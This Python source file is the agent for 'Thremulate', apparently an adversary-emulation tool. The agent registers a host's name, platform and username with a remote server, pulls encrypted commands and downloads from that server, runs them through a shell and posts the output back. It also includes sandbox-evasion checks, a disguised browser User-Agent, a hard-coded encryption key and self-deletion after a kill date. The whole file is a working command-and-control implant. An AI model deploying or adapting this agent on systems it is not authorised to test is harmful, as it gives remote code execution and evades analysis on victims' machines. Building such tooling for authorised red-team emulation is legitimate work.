import argparse
import datetime
import sys
from getpass import getuser
import os
import platform
import subprocess
import time
import urllib3
from random import randrange
from pathlib import Path
from cryptography.fernet import Fernet

from urllib3.exceptions import MaxRetryError

urllib3.disable_warnings()
http = urllib3.PoolManager()
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                         ' (KHTML, like Gecko) Chrome/78.0.3904.97 Safa'}
TIMEOUT = 15
executed = []
agent_id = 0
kill_date_string = ''
THIS_DIR = Path(__file__).parent

INTERVAL = 5
SERVER_IP = ''
VERBOSE = False


def agent_arguments():
    """
    Obtain the server IP and beacon interval for Agent.
    :return:
    """
    global SERVER_IP
    global INTERVAL
    global VERBOSE
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--server", help="IP address of the Thremulate server.")
    parser.add_argument("-i", "--interval", type=int,
                        help="Time interval in seconds for the Agent to check for new assignments.")
    parser.add_argument("-v", "--verbose", help="Increase Agent verbosity.", action="store_true")
    args = parser.parse_args()

    SERVER_IP = args.server
    INTERVAL = args.interval

    if SERVER_IP is None:
        sys.exit('[+] Server IP address is required\n[+] Agent Stopped!!\n[+] Use -h or --help flag for help')
    print('[+] Server is at %s' % SERVER_IP)
    if INTERVAL is None:
        INTERVAL = 5
        print('[+] No beacon interval set.\n[+] Agent defaulted to 5 seconds')
    if args.verbose:
        VERBOSE = True
        print("[+] Verbosity enabled")


def execute_command(command_issued):
    """
    Executes the tasks for the Agent.
    :param command_issued:
    :return:
    """
    cmd = subprocess.Popen(command_issued, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           stdin=subprocess.PIPE)
    executed.append(datetime.datetime.now())
    try:
        success, error = cmd.communicate(timeout=TIMEOUT)
    except subprocess.TimeoutExpired:
        cmd.kill()
        success, error = cmd.communicate()

    success = success.decode("utf-8")
    error = error.decode("utf-8")

    if error is not '':
        return 'Error--' + error

    if success == '' or success != '':
        return 'Success--' + success


def get_platform():
    """
    Obtains the platform of the Agent.
    :return:
    """
    # We need to handle the platform a bit differently in certain cases.
    # Otherwise, we simply return the value that's given here.
    plat = platform.system().lower()

    if plat == "darwin":
        # 'macos' is the term that is being used within the .yaml files.
        plat = "macos"

    return plat


def register():
    """
    Registers the Agent with the server.
    :return:
    """
    url = 'http://{0}:8080/register_agent'.format(SERVER_IP)
    global agent_id

    try:
        req = http.request('POST', url, fields={'id': agent_id, 'hostname': platform.node(), 'platform': get_platform(),
                                                'plat_version': platform.version(),
                                                'username': getuser()}, headers=headers)
        response = str(req.data.decode('utf-8'))

        if req.status == 200:
            response_split = response.split('.')
            agent_id = response_split[1]
            print('[+] ' + response_split[0])

    except MaxRetryError:
        sys.exit('[+] Agent failed to register with server after 3 retries\n[+] Agent stopped!!')


def get_techniques():
    """
    Obtains the IDs of techniques assigned to the Agent.
    :return:
    """
    try:
        url = 'http://{0}:8080/agent_techniques/{1}'.format(SERVER_IP, agent_id)
        req = http.request('GET', url, headers=headers)
        response = str(req.data.decode('utf-8'))

        if req.status == 200:
            if response == '':
                return ''
            response = response.split(',')
            result = []

            for res in response:
                if res is not '':
                    result.append(res)

            return result
        return

    except MaxRetryError:
        print('[+] Agent failed to contact server for techniques assigned after 3 retries')
        pass


def download_and_run_commands():
    """
    Obtains tasks from the server and sends them to another function for execution.
    :return:
    """
    if VERBOSE:
        print('[+] Checking for new tasks')
    global agent_id
    try:
        # url = ('http://%s:8080/agent_tasks/%s' % SERVER_IP % agent_id)
        url = 'http://{0}:8080/agent_tasks/{1}'.format(SERVER_IP, agent_id)
        req = http.request('GET', url, headers=headers)
        response = str(req.data.decode('utf-8'))
        response = symmetric_cipher(response, encrypt=False)
        if req.status == 200:
            results = []
            agent_commands = response.split('++')

            for i, command in enumerate(agent_commands):
                if command is '':
                    continue
                if i == 0:
                    global kill_date_string
                    kill_date_string = command
                    continue
                if '/atomics/' in command:
                    if ' & ' in command:
                        path_to_file = command.split(' & ')[0]
                        download(path_to_file)
                        command = command.replace(path_to_file + ' & ', '')
                    else:
                        sm_colon = command.index(';')
                        fwd_slash = command.index('/')
                        path_to_file = command[fwd_slash:sm_colon]
                        download(path_to_file)
                        command = command.replace(path_to_file + ';', '')
                results.append(execute_command(command))

            return results
        return
    except MaxRetryError:
        print('[+] Agent failed to contact server for tasks to execute after 3 retries')
        pass


def send_output():
    """
    Sends output to the server after working.
    :return:
    """
    std_out = download_and_run_commands()
    # url = 'http://%s:8080/agent_tasks/5' % SERVER_IP

    if std_out is None:
        print('[+] Failed to get techniques from the server')
        return
    if len(std_out) == 0:
        if VERBOSE:
            print('[+] No tasks assigned')

        return

    agent_tech = get_techniques()
    # http://%s:8080/agent_techniques/5 % SERVER_IP

    if agent_tech is None:
        # print('[+] Failed to get techniques from the server')
        return
    if agent_tech == '':
        if VERBOSE:
            print('[+] No techniques assigned')

        return

    url = 'http://{0}:8080/agent_output'.format(SERVER_IP)

    # Iterates over list of techniques assigned to an agent_tasks while selecting the respective
    # result or output after executing that technique
    for i, res in enumerate(agent_tech):
        try:

            req = http.request('POST', url, fields={'id': agent_id, 'tech': agent_tech[i], 'output': std_out[i],
                                                    'executed': ('%s' % executed[i])}, headers=headers)

            if req.status == 200:
                print('[+] Agent executed T%s' % agent_tech[i])

        except IndexError:
            pass
        except MaxRetryError:
            print('[+] Agent failed to send T%s execution results to server after 3 retries' % str(agent_tech[i]))
            pass


def confirm_kill():
    """
    Compares the Agent kill datetime with the current datetime and kills the Agent if time is due.
    :return:
    """
    if VERBOSE:
        print('[+] Checking kill datetime')
    global kill_date_string

    if kill_date_string == 'None' or kill_date_string == '':
        return

    try:
        kill_date = datetime.datetime.strptime(kill_date_string, '%Y-%m-%d %H:%M:%S')
    except ValueError:
        print('[+] Agent received invalid kill datetime')
        return

    now = datetime.datetime.now()
    if now > kill_date:
        path = Path(__file__)
        os.remove(path)

        sys.exit('[+] Agent killed. RIP')


def sandbox_evasion():
    """
    Checks if Agent is running in a Sand Box and terminates execution.
    :return:
    """
    # SANDBOX 1 :Check number of CPU core
    if os.cpu_count() >= 2:
        if VERBOSE:
            print('[+] Device has {0} CPUs'.format(os.cpu_count()))
        # Get the current time
        now = datetime.datetime.now()
        # Stop code execution for 1 seconds
        time.sleep(2)
        if VERBOSE:
            print('[+] Agent tried to sleep for 2 seconds')
        # Get the time after 2 seconds
        now2 = datetime.datetime.now()
        # SANDBOX 2 :Check if AV skipped sleep function
        if (now2 - now) > datetime.timedelta(seconds=1):
            if VERBOSE:
                print('[+] Agent not in a sandbox')
        else:
            sys.exit()


def download(file_path):
    url = 'http://{0}:8080{1}'.format(SERVER_IP, file_path)
    req = http.request('GET', url, headers=headers)
    payload = file_path.split("/")[-1]
    with open(payload, "wb") as file_download:
        file_download.write(req.data)


def symmetric_cipher(text, encrypt=True):
    """
    Encrypts or Decrypts a string using AES symmetric cipher.
    :param text:
    :param encrypt:
    :return: cipher or plaintext string
    """
    cipher_key = b'2ITm7dWcIz5BcGWVsyovqh8PHkIGKZaXWV1nr5AT834='
    f = Fernet(cipher_key)
    if encrypt:
        cipher_text = f.encrypt(text.encode('utf-8'))
        return cipher_text.decode('utf-8')
    else:
        plaint_text = f.decrypt(text.encode('utf-8'))
        return plaint_text.decode('utf-8')


if __name__ == '__main__':
    try:
        agent_arguments()
        sandbox_evasion()
        print('[+] Agent running')

        agent_id = randrange(1000, 9999)
        register()

        while True:
            time.sleep(INTERVAL)
            send_output()
            confirm_kill()
    except KeyboardInterrupt:
        sys.exit('[+] Agent stopped')
